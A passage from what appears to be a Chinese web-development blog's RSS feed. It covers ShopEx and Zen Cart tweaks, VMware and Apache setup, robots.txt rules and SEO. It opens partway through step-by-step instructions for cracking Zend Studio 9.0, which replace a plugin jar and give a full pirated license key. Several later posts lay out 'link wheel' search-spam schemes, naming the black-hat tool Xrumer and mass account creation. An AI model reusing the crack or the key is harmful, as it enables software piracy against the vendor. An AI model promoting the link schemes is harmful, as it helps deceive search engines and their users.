第二步：下载com.zend.php.core_9.0.0.201111081531.jar文件，下载成功后复制到你安装Zend Studio 9.0的plugins目录下，覆盖同名文件。
第三步：启动Zend Studio 9.0，输入如下注册码License key：（注意没有空格也没有换行）
34E606CF10C3E4CF202ABCEAA9B0B7A64DD2C5862A514B944AAAB38E3EB8A5F2CD735A2AB4CF9B952590EFA62BA0AB2B3E5D99C33C55309EE143165AC7F1817D626574615F3B32312F31312F323031313B392E303B3030313B313B3330 第四步：查看是否注册成功，在菜单中“help&amp;gt;About Zend Studio ”, 显示如下图。
过期时间9999年12月31日说明注册破解成功完成。
Zend Studio 9汉化方法
官方汉化包
1.在线下载语言包：help-&amp;gt;Install new software-&amp;gt;add 添加网址http://download.eclipse.org/technology/babel/update-site/R0.9.0/helios
出现padding…字样，等待个几分钟，看网速度然后选择简体中文(注意在勾选简体中文的时候点一下checkbox框等待一下 有点卡。)
然后下一步。。。下一步。。下一步。。。
2.离线下载语言包
使用方法是解压后覆盖。下载地址是：http://dl.dbank.com/c0dmtyjzs5
注意：
你没破解成功，不防看一下是不是这个原因造成的？
最近发现好多朋友告诉我说注册破解没有成功，我看了下主要是因为把下载的那个破解包给解压了，造成破解不成功。所以下载完这个破解包后千万不要解压，直接覆盖到你安装Zend Studio 9.0的plugins目录下的同名文件。</description>
    </item>
    
    <item>
      <title>在站外调用ShopEx网店中的widget挂件</title>
      <link>https://ifunbox.top/204.html</link>
      <pubDate>Fri, 25 Nov 2011 01:31:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/204.html</guid>
      <description>ShopEx中的widget挂件可以灵活展示网店内的商品、分类、文章等数据，但widget挂件只能用在ShopEx自身系统中，如果想在站外引用就没那么简单了，比如在博客中引用一个ShopEx的挂件展示一下网店内的商品，解决方法如下利用ShopEx自定义模板页面结合Iframe方式显示网店内挂件内容的方法：
1、在页面管理/模板列表/编辑模板，创建一个新的“站点栏目单独页”模板页面，编辑这个模板页面的源码，用以下代码替换原有的模板页面代码，然后保存。








&amp;lt;{main}&amp;gt;


2、在站点栏目中添加一个顶级栏目，类型选“单独页面”，模板选刚才我们新建的这个，保存后在可视编辑这个页面的界面上，添加我们所需要展示的挂件版块到页面。保存后在站点栏目中设置这个页面不显示在导航中，以免在网店导航菜单中显示这个页面的链接。可以在站点栏目点浏览按钮查看这个页面的URL，这个页面现在只有一个我们刚才添加的widget挂件，可以在站外被干净的引用了。


3、在博客编辑时插入iframe代码引用展示这个新创建的独立页面，代码如下：

转自http://www.shopextool.cn/blog/?p=77
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>如何自定义shopex边框</title>
      <link>https://ifunbox.top/202.html</link>
      <pubDate>Thu, 24 Nov 2011 02:45:18 +0000</pubDate>
      
      <guid>https://ifunbox.top/202.html</guid>
      <description>首先：在模板文件themes/fanhefan/borders/目录下新建文件border9.html，这里的border_nav.html是你等下要调用的文件，可以随便命名。
其次：在themes/fanhefan下修改这两个文件：theme.xml，info.xml。再两个文件中找 到,在中间你会看到原来的一些东西，需要的话就不用删除，直接加
然后，可以开始写border_nav.html的内容了，css+div不二的选则，写作规则可以参照这个例子，也可以结合其他自带边框的例子。
&amp;amp;lt;div id=”&amp;amp;lt;{$widgets_id}&amp;gt;”&amp;gt; &amp;lt;div&amp;gt; &amp;lt;h3&amp;gt; &amp;amp;lt;{$title}&amp;gt; &amp;lt;/h3&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;amp;lt;{$body}&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;/div&amp;gt; &amp;amp;lt;/div&amp;gt;  根据自己的需要调整，相信大家可以写好的。样式表在themes/fanhefan/images/border中添加。
最后就是要应用了，我们要先到网站后台备份一下模板，然后再次点击应用备份模板，你就会发现你写的边框在板块边框选择中出现了。注意，一定要先备份下模板，否则你写的东西是没法显示的。</description>
    </item>
    
    <item>
      <title>加入收藏夹javascript代码</title>
      <link>https://ifunbox.top/197.html</link>
      <pubDate>Wed, 23 Nov 2011 08:34:00 +0000</pubDate>
      
      <guid>https://ifunbox.top/197.html</guid>
      <description>&amp;lt;a href=&amp;quot;#&amp;quot; onclick=&amp;quot;addfavorite()&amp;quot;&amp;gt;加入收藏！&amp;lt;/a&amp;gt;  测试了下IE6.0+和FireFox均正常，Chrome 没效果</description>
    </item>
    
    <item>
      <title>解决fast_and_easy_checkout与seo_urls冲突导致页面打不开的方法</title>
      <link>https://ifunbox.top/194.html</link>
      <pubDate>Sat, 19 Nov 2011 10:37:27 +0000</pubDate>
      
      <guid>https://ifunbox.top/194.html</guid>
      <description>fast_and_easy_checkout与seo_urls冲突导致页面打不开的根本原因是zencart静态化全开后，系统把index.php?main_page=checkout&amp;amp;fecaction=null优化成checkout.html。
解决fast_and_easy_checkout与seo_urls冲突的问题其实很简单，找到includes/functions/html_output.php内20行附近
if((SEO_URLS_ONLY_IN!=&amp;#8221;&amp;#8221;) &amp;amp;&amp;amp; !in_array($page,$sefu)) {
改成
if(((SEO_URLS_ONLY_IN!=&amp;#8221;&amp;#8221;) &amp;amp;&amp;amp; !in_array($page,$sefu)) || $page == &amp;#8216;checkout&amp;#8217;) {
这样fast_and_easy_checkout与seo_urls冲突导致页面打不开就此解决，在fast_and_easy_checkout与seo_urls插件的支持下zencart系统显得更加强大，用户体验也更好了
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>ShopEx自动生成用户名以及随机密码（MD5）</title>
      <link>https://ifunbox.top/190.html</link>
      <pubDate>Fri, 18 Nov 2011 09:13:19 +0000</pubDate>
      
      <guid>https://ifunbox.top/190.html</guid>
      <description>ShopEx自动生成用户名以及随机密码（MD5）
该程序是自动生成10000个用户名（11位数字没有4，首位为1），用户名后5位为密码。
之前不知道ShopEx是怎么加密的，但是研究了发现ShopEx是用MD5加密的，所以SQL语句中密码（用户名后5位数字）都经过MD5处理。
&amp;lt;?php //生成XLS //header(&amp;quot;Content-type:application/vnd.ms-excel&amp;quot;); //header(&amp;quot;Content-Disposition:filename=test.xls&amp;quot;); //echo &amp;quot;卡号\t&amp;quot;; //echo &amp;quot;密码\t&amp;quot;; //echo &amp;quot;MD5\t\n&amp;quot;; $length = 10; //除首位为1用户名的位数 $arr2 = array(); //存入会员卡号，防止相同卡号 for ($i=0;$i&amp;lt;10000;$i++) { $arr[$i] = array(); //存入卡号,密码,MD5 $pattern=&#39;123567890&#39;; //随机数字，不含4 $no = 1; //会员卡号首位为1 unset($ps); unset($key); for($j=0;$j&amp;lt;$length;$j++) { $key = $pattern{rand(0,8)}; $no .= $key; if($length-5 &amp;lt;= $j) //截取后五位 $ps .= $key; } if(!in_array($no,$arr2)) { array_push($arr[$i], $no, $ps, md5($ps)); $arr2[$i] = $no; }else { $i--; } } /*XLS输出格式 foreach($arr as $tmp) echo $tmp[0].</description>
    </item>
    
    <item>
      <title>Windows 7中虚拟机VMware无线网络图文配置教程</title>
      <link>https://ifunbox.top/181.html</link>
      <pubDate>Sun, 13 Nov 2011 13:22:39 +0000</pubDate>
      
      <guid>https://ifunbox.top/181.html</guid>
      <description>看完全文，我想你应该就懂虚拟机VMware网络配置了，保持你的耐心吧。
先说我的机器配置：Windows7 中文旗舰版，64位系统，Acer笔记本，虚拟机Centos6.0 我的网络适配器如下
 成功用虚拟机VMware网络配置的前提条件：
首先，设备管理器里面要有VMware Virtual Ethernet Adapter for VMnet1和VMware Virtual Ethernet Adapter for VMnet8(其实只需要8，不需要1也行)。且显示无问题。如下图所示：
 其次，控制面板\网络和共享中心-&amp;gt;网络连接里面，你的网卡属性里面(这边我用无线上网所以右键属性打开)，VMware Bridge Protocol协议打钩(这边要注意是你的物理网卡，而不是虚拟网卡的属性，虚拟网卡可以不打勾)
 另外，系统服务中没有更改默认VMware所续启动的三个必要服务。 如果上述必要设置有问题，只要重新安装下VMware，或者选择修复安装，一般问题都会解决。
虚拟机VMware网络配置的详细步骤：(以下设置最好是都用管理员身份运行)
1、打开VMware Workstation菜单栏编辑-&amp;gt;虚拟网络编辑器（Virtual Network Editor）
2、选中VMnet8，类型NAT,记下下面的Gateway IP Address，比如说我的就是192.168.32.0;然后打开NAT设置，记下里面的网关:192.168.32.2
 3、打开DHCP标签页，记下Start IP Address和End IP Address，比如说我的就是192.168.32.128和192.168.32.254
4、关闭VMware，Virtual Network Editor，运行VMware Workstation，在菜单栏中，选择虚拟机-&amp;gt;设置下的网络适配器运行方式为第二种(NAT:Used to share the host&amp;#8217;s IP address
5、启动虚拟机，比如说我的是Centos6.0，并打开网络设置
 6、更改本地连接属性里面的TCP/IP属性，选择使用下面的IP地址，其中，IP Address填刚才DHCP页面里面记下的两个IP地址中的随便一个IP，也就是说从192.168.32.128到192.168.32.254，随便选一个，我选的是192.168.32.202。子网掩码（Netmask）是自动填的255.255.255.0，默认网关（Gateway）和下面的DNS是填刚才NAT页面记下的IP，比如我的是192.168.32.2。
 7、打开浏览器，输入 http://www.fanhefan.com/ ,能上网了。
 虚拟机VMware网络配置到此结束。　 而我的情况还比较特殊，有两台虚拟机，并且无限上网使用了代理 proxy.xxxx.com 一台:192.168.32.202 数据库服务器
一台:192.168.32.203 应用程序和前端服务器
203与202不同的地方时
203 的多配置一个DNS,ip位202的
这样以后，
IE连接使用了代理就能外网，但是不能连接数据库，否则能连接数据库，不能上外网，</description>
    </item>
    
    <item>
      <title>Apache&#43;PHP&#43;MySQL在Windows XP下的安装与配置</title>
      <link>https://ifunbox.top/175.html</link>
      <pubDate>Sat, 12 Nov 2011 13:37:28 +0000</pubDate>
      
      <guid>https://ifunbox.top/175.html</guid>
      <description>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝相关信息＝＝＝＝＝＝＝＝＝＝＝＝＝
操作系统：Windows XP SP2
Apache版本：2.2.8 下载 (安装在C:/Program Files/Apache Software Foundation/Apache2.2)
PHP版本：5.2.5 下载 (安装在C:/php)
MySQL版本：5.0.51a下载 (安装在C:/Program Files/MySQL/MySQL Server 5.0)
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
软件的安装很简单，按提示一步一步操作，一般不会出什么问题，这里略过，主要讲一下如何配置。Apache安装成功后，在浏览器地址栏中输入http://localhost测试，如果看到“It works!”的字样，说明Apache安装是成功的。你应该根据你的安装路径做相应的修改。

(1)httpd.conf配置
打开httpd.conf，找到#LoadModule vhost_alias_module modules/mod_vhost_alias.so，在它的后面添加以下内容：
LoadModule php5_module &amp;#8220;C:/php/php5apache2_2.dll&amp;#8221;
AddType application/x-httpd-php .php
AddType application/x-httpd-php-source .phps
PHPIniDir &amp;#8220;C:/php&amp;#8221;
找到DocumentRoot &amp;#8220;C:/Program Files/Apache Software Foundation/Apache2.2/htdocs&amp;#8221;，修改成Web文件的存放路径，如我的Web文件存放在F:/WebRoot目录下，就修改成：
DocumentRoot &amp;#8220;F:/WebRoot&amp;#8221;
找到，修改成Web文件的存放路径，跟上面的路径相同，修改成：
 找到DirectoryIndex index.html，添加index.php：
DirectoryIndex index.html index.php  (2)php.ini配置
在PHP的安装目录下有php.ini-dist(默认配置)和php.ini-recommended(推荐配置)两个预置的配置文件，它们之间的区别是：推荐配置在安全性方面有所加强。根据需要选择，初始配置时最好选择php.ini-dist(因为它是默认的*^_^*)，复制并将其重命名为php.ini，就放在PHP的安装目录。(注意：php.ini-recommended中的short_open_tag是关闭的，这意味着标签中的内容是不能被解析的，这种情况下查看PHP网页的源文件，看到的内容会跟你的源代码是一样的，正确的方法是使用，也推荐大家使用此标签。)  打开php.ini，找到extension_dir = &amp;#8220;./&amp;#8221;，修改成：
extension_dir = &amp;#8220;C:/php/ext&amp;#8221;
 找到;extension=php_mysql.dll，把;去掉：
extension=php_mysql.dll  (3)libmysql.dll
将PHP目录下的libmysql.dll复制到%SystemRoot%/System32/目录中。用MySQL的bin目录中的libmysql.dll也行。  注意：
1.由于我安装的Apache版本是2.2.8，所以LoadModule语句应选择php5apache2_2.dll，否则会出现错误“The request operation has failed!</description>
    </item>
    
    <item>
      <title>Robots META标签的语法规则及其使用技巧</title>
      <link>https://ifunbox.top/168.html</link>
      <pubDate>Sat, 12 Nov 2011 05:32:52 +0000</pubDate>
      
      <guid>https://ifunbox.top/168.html</guid>
      <description> Robots META标签与robots.txt不同之处在于Robots META标签则主要是针对一个个具体的页面。和其他的META标签（如使用的语言、页面的描述、关键词等）一样，Robots META标签也是放在页面的＜head＞＜/head＞中，专门用来告诉搜索引擎ROBOTS如何抓取该页的内容。 
Robots META标签的写法：  Robots META标签中没有大小写之分，name=”Robots”表示所有的搜索引擎，可以针对某个具体搜索引擎写为name=”BaiduSpider”。 content部分有四个指令选项：index、noindex、follow、nofollow，指令间以“,”分隔。 
INDEX 指令告诉搜索机器人抓取该页面； 
FOLLOW 指令表示搜索机器人可以沿着该页面上的链接继续抓取下去； 
Robots Meta标签的缺省值是INDEX和FOLLOW，只有inktomi除外，对于它，缺省值是INDEX,NOFOLLOW。 
这样，一共有四种组合：
 ``` 以下是引用片段： ＜META NAME=”ROBOTS” CONTENT=”INDEX,FOLLOW”＞ ＜META NAME=”ROBOTS” CONTENT=”NOINDEX,FOLLOW”＞ ＜META NAME=”ROBOTS” CONTENT=”INDEX,NOFOLLOW”＞ ＜META NAME=”ROBOTS” CONTENT=”NOINDEX,NOFOLLOW”＞ ```    其中
 ```以下是引用片段： ＜META NAME=”ROBOTS” CONTENT=”INDEX,FOLLOW”＞ 可以写成 ＜META NAME=”ROBOTS” CONTENT=”ALL”＞； ＜META NAME=”ROBOTS” CONTENT=”NOINDEX,NOFOLLOW”＞ 可以写成 ＜META NAME=”ROBOTS” CONTENT=”NONE”＞ ```    目前看来，绝大多数的搜索引擎机器人都遵守robots.txt的规则，而对于Robots META标签，目前支持的并不多，但是正在逐渐增加，如著名搜索引擎GOOGLE就完全支持，而且GOOGLE还增加了一个指令“archive”，可以限制GOOGLE是否保留网页快照。例如：
 以下是引用片段：
``` ＜META NAME=”googlebot” CONTENT=”index,follow,noarchive”＞ ```    </description>
    </item>
    
    <item>
      <title>robots.txt语法规则及其使用技巧</title>
      <link>https://ifunbox.top/162.html</link>
      <pubDate>Sat, 12 Nov 2011 05:22:43 +0000</pubDate>
      
      <guid>https://ifunbox.top/162.html</guid>
      <description>robots.txt是搜索引擎中访问网站时访问的第一个文件。robots.txt文件提示蜘蛛在服务器上什么文件网页是可以被访问的，什么文件网页不是能被访问的。
当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被robots meta标签口令保护的页面。
 robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。   基本语法：最简单的 robots.txt 文件使用两条规则：  · User-Agent: 适用下列规则的漫游器
· Disallow: 要拦截的网页
我们常用的搜索引擎类型有：
google蜘蛛：googlebot
百度蜘蛛：baiduspider
yahoo蜘蛛：Yahoo!slurp
alexa蜘蛛：ia_archiver
bing蜘蛛：MSNbot
altavista蜘蛛：scooter
lycos蜘蛛：lycos_spider_(t-rex)
alltheweb蜘蛛：fast-webcrawler
inktomi蜘蛛： slurp robots.txt文件的写法 User-agent: * 这里的*代表的所有的搜索引擎种类，*是一个通配符 Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录 Disallow: /require/ 这里定义是禁止爬寻require目录下面的目录 Disallow: /ABC/ 这里定义是禁止爬寻ABC整个目录　 Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下的所有以&amp;#8221;.htm&amp;#8221;为后缀的URL(包含子目录)。 Disallow: /*?* 禁止访问网站中所有的动态页面 Disallow: /jpg$ 禁止抓取网页所有的.jpg格式的图片（$ 字符指定与网址的  结束字符进行匹配）  Disallow:/ab/adc.html 禁止爬去ab文件夹下面的adc.html文件。    例1. 禁止所有搜索引擎访问网站的任何部分
User-agent: *
Disallow: /
实例分析：淘宝网的 Robots.txt文件
User-agent: Baiduspider</description>
    </item>
    
    <item>
      <title>高级链轮解析</title>
      <link>https://ifunbox.top/146.html</link>
      <pubDate>Wed, 09 Nov 2011 14:50:49 +0000</pubDate>
      
      <guid>https://ifunbox.top/146.html</guid>
      <description>下文中会涉及到Xrumer这是来自俄罗斯的一个黑帽工具，由于破解版其少无比、正版价格在4000RMB左右，这里就不建议朋友们用了，那东西最大的好处就是迅速提升外链，今天我们的重点是讲 link wheel 策略，这里就将Xrumer换掉，改成适合国内站长使用的策略吧，自己动手丰衣足食啊。 
在建设链轮前，请优化好你的站点，你的站点就如车子，如果车子的内部结构还没完成，要轮子也没用，所以建议还是先闭门将车身造好，再配上精心打造的轮子，这样就可以驰骋在搜索引擎的天地里了。

看上去这个轮子比较复杂，其实你想得太复杂了，事实上这个结构清晰的轮子是非常容易理解的，我们先看图中的红色金字塔，如果你是做英文站的，这里推荐你用wordpress（全自动WP外链插件：Automatic Backlink Creator）搭建五个不同内容的站点，为了方便大家操作执行，可以用wp替代，至于链接的个
数，理论上是没有限制的，当然这个要根据自己的站点情况来定，新站就少些，老站就多些，循序渐进，再就是要导出五个链接到蓝色球，记住，这是单向的，蓝色球不用导出链接到红色金字塔上。 
 再看绿色的金字塔，如果是做英文站的朋友建议申请blogger，因为谷歌对其非常有好权重也高，国内的就用新浪博客，新浪博客的权重比较高收录也快，这里你需要建立 5 个博客，每个博客你要最少推荐 3 个核心关键词，这些文章的内容需要相关性高，不要重复内容。每个蓝色球都导出一个链接到绿色金字塔上，这是单向的导出链接，其次就是绿色金字塔之间也是单向链接，按照顺序链接，后面会给大家一个链接的方向，方便新人学习，最后，不要忘记了，由绿色金字塔导出链接，链接到你的主站上。   现在说说蓝色的球，做英文站的朋友可以申请twitter、Youtube、facebook，中文的朋友推荐用google buzz或人民网的微博，这里需要申请25个，每个轮子5个，五个轮子就是25个，工作量有点枯燥，没有办法，你要站到谷歌的顶峰欣赏风景，就得耐得住寂寞，放弃路边的野花野草。蓝色球之间也是单向链接的，然后分别单向链接绿色金字塔。 
最后，那个在图中间的金色房子就是你的主站，一个你做了内部优化的主站。 
下面我们看看这些轮子是如何链接的：    下面我们来整理下，各元素之间的链接是怎样形成的： 
［1］红色金字塔：吸引大量外部链接：链接到［2］［3］［4］［5］［6］ 
［2］蓝色球 1：您的微博：链接［3］和［7］ 
［3］蓝色球 2：你的微博：链接到［4］和［7］ 
［4］蓝色球 3：你的微博：链接为［5］和［7］ 
［5］蓝色球 4：你的微博：链接［6］和［7］ 
［6］蓝色球 5：你的微博：链接［2］和［7］ 
［7］绿色金字塔：链到主站，绿色金字塔之间单向链接，形成一环。  </description>
    </item>
    
    <item>
      <title>高级链接轮—链接轮群落（Link Wheel Village）模型</title>
      <link>https://ifunbox.top/141.html</link>
      <pubDate>Wed, 09 Nov 2011 14:28:33 +0000</pubDate>
      
      <guid>https://ifunbox.top/141.html</guid>
      <description>链接轮群落感觉上更为立体，在站群的权重培养上更为注重。隐蔽性较强，复杂庞大的站外链接群，更不易被搜索引擎判断为作弊行为。
链接轮群落模型说明： 

推广的主站：Yellow House
粉红金字塔：Red Pyramid 
可以采用各种内容相关的博客、小型站点等等。理论上这些站点的外链没有任何限制，因此可以采用外链
软件（例如虫虫一些国内软件就可以胜任），但是需要确保从粉红金字塔出来的链接只有5个。 
篮色球：Blue Balls 
一些web2.0站点，比如微博，可以没有什么实质内容。 
绿色金字塔：Green Pyramid 
这些站需要与主站的核心关键字具有相关性，最好是独立的IP站。 
链接说明： 
A：2、3、4、5、6的 5个蓝色球之间使用一个单向的链接轮链接方式进行链接，然后分别指向绿色金字塔。
粉红金字塔1 分别链接向5 个篮色球。 
B：绿色金字塔之间进行一次链接轮链接，并分别指向主站。 
说明： 
高级链接轮的链接策略引自《The Link Wheel Village &amp;#8212; Superior Link Wheel Concept Building Guide》一文。本文只引用了其中的链接模型部分，该链接建设方案中使用到了外链工具&amp;#8212;xrumer（还有一些更为具体要求，比如，主站（yellow house）的基本要求： 
a、友好的SEO Title tags； 
b、独特的、能够被蜘蛛索引的内容； 
c、使用、等权重标签； 
d、meta keywords 具备关键词标签； 
e、meta description 具备描述标签； 
f、valid code 规范的网站代码； 
主站达到这些要求以后就什么也不用做，专心做好外部的链接轮群落的建设坐等排名上升。更为具体的说明还是请各位参阅原文文档。</description>
    </item>
    
    <item>
      <title>简单的链接轮的基本模型介绍</title>
      <link>https://ifunbox.top/138.html</link>
      <pubDate>Wed, 09 Nov 2011 14:08:46 +0000</pubDate>
      
      <guid>https://ifunbox.top/138.html</guid>
      <description>SQUIDOO、WordPress、Blogger、Quizill、Weebly 等为群建网站，然后站点进行一个单方向的链接形成一个环状，形象的称之为链接轮。传统的链接建设方式则少了黑色箭头示意的环状单向链接部分。将上面简单的链接轮模型进一步扩展，使用一些使用一些web2.0站点Digg、buzz、del.icio.us、twitter进行链接，继续加强Blogger权重培养。 
简单的链接轮的基本模型如下图所示： 

继续在站外建设多个链接轮模型然后指回主站则形成下面的模型： 

链接轮的精髓在于：注重群炸权重培养，充分发挥外链的作用。 在链接轮的基础之上，有人想出了更为高级复杂链接轮模型 &amp;#8212; Link Wheel Village（权且称之为链接轮群落）。 
如果你理解了简单链接轮模型，你可以继续学习高级链接轮—链接轮群落（Link Wheel Village）模型</description>
    </item>
    
    <item>
      <title>博客 SEO 链轮模型介绍</title>
      <link>https://ifunbox.top/135.html</link>
      <pubDate>Wed, 09 Nov 2011 13:49:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/135.html</guid>
      <description>以 ABCDE 五个博客名，其中在 A 博客中发一个文章，关键词以你要优化的网
站的关键字，在文章里面做指向你网站的锚文本。然后在文章结尾的时候，再做一个锚文本指向 B 博客，这个锚文本的名字可能是 B 博客的名字。同样的方法，B 博客写的文章也是关键字指向你的网站，在文章的结尾做一个链接到 C 博客,以此类推。这样就一定程度上形成了SEO链轮了。 
SEO链轮模型示意图如下所示：
1.1. 百度空间,原因排名好，百度自家的东西当然优先考虑啦; 
1.2. 搜狐，原因收录快； 
1.3. 新浪，原因转载方便。收录也不错，而且权重都高； 
1.4. 网易，原因网易里面有一个分享，在文章的底部，可以把文章分享到 QQ 书签，大家写完文章的时候一定要分享下。这里你可以建 N 个 QQ 去分享这个文章。那么你的这个文章 里面的链接百度就会喜欢了。嘿嘿。同样的方法你可以用在其它的博客，只要有分享的，都 可以用； 
1.5. 博客大巴，原因收录快； 
1.6. 中金博客，原因收录快，而且文章左下角也有收藏夹。可以一用，非常 GOOD。 
选上面的博客还有原因，其中搜狐，因为它分享到微博很方便，文章左下角点一下分享到微 博很方便，而且，我在发文章的时候用到两个网站，第一个，谷歌杀手（本站验证过，当天 发表，第二天就被收录），我每发一个文章都提交到谷哥杀手。这个外链收录飞快。提多少 收录多少。而且，谷歌杀手下面也有收藏夹。大家提交完文章可以点收藏。 
第二个网站是宝盒网，我在博客写完的文章都会收藏到宝盒网，大家只要把宝盒网的那个右键工具安装好，文章发出来后，直接右键就收录了。非常方便。因为这几个博客收藏到宝盒网很好，所以选这个，像天涯的话，不兼容，还有几个博客也不兼容。这里不推荐。</description>
    </item>
    
    <item>
      <title>30 个最好的jQuery表单插件</title>
      <link>https://ifunbox.top/127.html</link>
      <pubDate>Tue, 08 Nov 2011 15:13:10 +0000</pubDate>
      
      <guid>https://ifunbox.top/127.html</guid>
      <description>&lt;p&gt;&lt;span style=&#34;font-size: large;&#34;&gt;jQuery 的出现为我们的开发工作带来了极大的便利，而众多的基于jQuery插件的出现就犹如我们在 Firefox 中安装名目繁多的插件一样而乐此不疲，今天带给大家的是精心挑选的这30个最好的jQuery表单插件，希望能提高您的 工作效率，如果您还有更好的，请在次留下您的建议。&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&#34;span-style-font-size-large-a-href-http-plugins-jquery-com-project-ufvalidator-rel-nofollow-target-blank-advanced-form-validation-a-span&#34;&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://plugins.jquery.com/project/ufvalidator&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;Advanced Form Validation&lt;/a&gt;&lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://plugins.jquery.com/project/ufvalidator&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://i709.photobucket.com/albums/ww92/zsmin/iwanna/Article/201004/advval.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;
 &lt;span style=&#34;font-size: large;&#34;&gt;Form Validator的几个特点，如：支持域的分组要求或有条件的验证它是否有效。您也可以验证字符串、数字、日期及邮箱等。您也可以组合多个验证条件。例 如：验证输入的字段必需为数字的且最小长度为5。&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&#34;span-style-font-size-large-a-href-http-www-geektantra-com-2009-09-jquery-live-form-validation-rel-nofollow-target-blank-jquery-live-form-validation-a-span&#34;&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://www.geektantra.com/2009/09/jquery-live-form-validation/&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;jQuery Live Form Validation&lt;/a&gt;&lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://www.geektantra.com/2009/09/jquery-live-form-validation/&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://i709.photobucket.com/albums/ww92/zsmin/iwanna/Article/201004/jqliveforms.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;
 &lt;span style=&#34;font-size: large;&#34;&gt;帮助您简单地创建表单验证的一款jQuery的插件，高度灵活、有大量的自定义选项。&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&#34;span-style-font-size-large-a-href-http-plugins-jquery-com-project-jqueryvalidate-rel-nofollow-target-blank-jquery-validate-a-span&#34;&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://plugins.jquery.com/project/jqueryvalidate&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;jquery.validate&lt;/a&gt;&lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;&lt;span style=&#34;font-size: large;&#34;&gt;&lt;a href=&#34;http://plugins.jquery.com/project/jqueryvalidate&#34; rel=&#34;nofollow&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://i709.photobucket.com/albums/ww92/zsmin/iwanna/Article/201004/jqval.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;
 &lt;span style=&#34;font-size: large;&#34;&gt;jQuery插件帮助您完成输入表单验证中所有单调而重复的工作。您只需要指定哪些表单需要验证，该插件会帮助您处理剩余的部分。&lt;/span&gt;&lt;br /&gt;
 &lt;span style=&#34;font-size: large;&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>CSS样式图片批量下载助手</title>
      <link>https://ifunbox.top/123.html</link>
      <pubDate>Tue, 08 Nov 2011 09:32:20 +0000</pubDate>
      
      <guid>https://ifunbox.top/123.html</guid>
      <description>
功能简介：
 本程序主要适用于仿站!其实全站静态化软件也可以实现他的功能，他更为小巧方便，国人开发中文界面。  使用方法：  打开从网上下载保存的Css样式文件，按照程序第一、二、三、四步进行处理，Css文件中的图片会被保存下来，默认保存路径是Css文件所在目录，并自动修改Css文件中原图片路径地址为相对地址，修改前会自动备份原文件。  下载链接：CSS样式图片下载助手  </description>
    </item>
    
    <item>
      <title>搜索引擎优化相关知识-百度篇</title>
      <link>https://ifunbox.top/120.html</link>
      <pubDate>Mon, 31 Oct 2011 14:32:38 +0000</pubDate>
      
      <guid>https://ifunbox.top/120.html</guid>
      <description>什么是好的url？  创建具有良好描述性、规范、简单的url，有利于用户更方便的记忆和判断网页的内容，也有利于搜索引擎更有效的抓取您的网站。网站设计之初，就应该有合理的url规划。 
我们建议： 
网站中同一网页，只对应一个url。 
如果网站上多种url都能访问同样的内容，会有如下危险：
 搜索引擎会选一种url为标准，可能会和正版不同   用户可能为同一网页的不同url做推荐，多种url形式分散了该网页的权重   如果你的网站上已经存在多种url形式，建议按以下方式处理：  在系统中只使用正常形式url，不让用户接触到非正常形式的url   不把Session id、统计代码等不必要的内容放在url中   不同形式的url，301永久跳转到正常形式   防止用户输错而启用的备用域名，301永久跳转到主域名   使用robots.txt禁止Baiduspider抓取您不想向用户展现的形式    怎样书写页面对搜索引擎最友好？   title信息 网页的title用于告诉用户和搜索引擎这个网页的主要内容是什么，而且当用户在百度网页搜索中搜索到你的网页时，title会做为最重要的内容显示在摘要中。 
搜索引擎在判断一个网页内容权重时，title是主要参考信息之一。 
我们建议 
通常网页标题可以这样描述：  首页：网站名称 或者 网站名称_提供服务介绍or产品介绍 频道页：频道名称_网站名称 文章页：文章title_频道名称_网站名称   同时一些需要注意的点是：  标题要主题明确，包含这个网页中最重要的内容 简明精练，不罗列与网页内容不相关的信息 用户浏览通常是从左到右的，重要的内容应该放到title的靠前的位置 使用用户所熟知的语言描述。如果你有中、英文两种网站名称，尽量使用用户熟知的那一种做为标题描述   Meta信息 Meta description是meta标签的一部分，位于html代码的区。 
Meta description是对网页内容的精练概括。如果description描述与网页内容相符，百度会把description当做摘要的选择目标之 一，一个好的description会帮助用户更方便的从搜索结果中判断你的网页内容是否和需求相符。</description>
    </item>
    
    <item>
      <title>wordpress页面速度优化必备插件</title>
      <link>https://ifunbox.top/112.html</link>
